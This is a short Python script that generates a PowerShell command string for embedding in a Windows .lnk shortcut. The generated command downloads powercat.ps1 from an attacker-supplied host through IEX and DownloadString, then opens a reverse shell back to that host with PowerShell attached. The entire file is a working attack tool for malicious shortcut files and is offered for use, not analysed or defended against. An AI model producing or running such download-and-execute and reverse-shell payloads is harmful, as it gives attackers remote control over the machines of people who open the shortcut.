# Generate a string to be used in a .lnk file that causes PowerShell to download powercat and run a reverse shell.
import argparse

parser = argparse.ArgumentParser(
    prog="Powercat Reverse Shell Generator",
    description="Generate a string to be used in a .lnk file that causes PowerShell to download powercat and run a reverse shell."
)

parser.add_argument("-l", "--lhost", required=True)
parser.add_argument("-pp", "--python-port", default=8000, type=int)
parser.add_argument("-p", "--port", default=443, type=int)

args = parser.parse_args()

rshell = (f"\"IEX(New-Object System.Net.WebClient).DownloadString('http://{args.lhost}:{args.python_port}/powercat.ps1');"
          f'powercat -c {args.lhost} -p {args.port} -e powershell"')

preamble = 'powershell.exe -c '
print(preamble + rshell)
